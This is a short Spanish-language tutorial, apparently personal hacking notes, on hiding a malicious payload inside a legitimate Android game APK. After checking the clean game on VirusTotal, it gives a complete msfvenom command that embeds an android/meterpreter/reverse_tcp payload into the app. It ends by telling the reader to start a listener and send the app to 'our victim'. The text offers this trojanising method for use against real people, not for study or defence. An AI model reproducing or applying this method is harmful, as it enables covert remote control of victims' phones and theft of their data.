Para ocultar una apk maliciosa dentro de una aplicacion real, una aplicacion que se use en su día a día. Esto lo podemos lograr descargando en primer instancia una apk cualquiera en este caso vamos a descargar una apk de el juego *Traffic Rider* peor primero vamos a comprobar que esta no tenga ningún tipo de virus con *Virus Total*. 

![[Pasted image 20240114153909.png]]

Nuestra APK instalada en combo apk no posee ningún virus por lo que nosotros vamos a proceder a infectarlo. Para eso vamos a usar el mismo parametro de siempre con msfvenom pero le agregaremos uno nuevo.

```bash 
msfvenom -x 'Traffic Rider_1.98_apkcombo.com.apk' -p android/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -o TrafficRider.apk
```

Y listo ya hablemos creado todo solo quedara ponernos en escucha y enviárselo a nuestra victima.

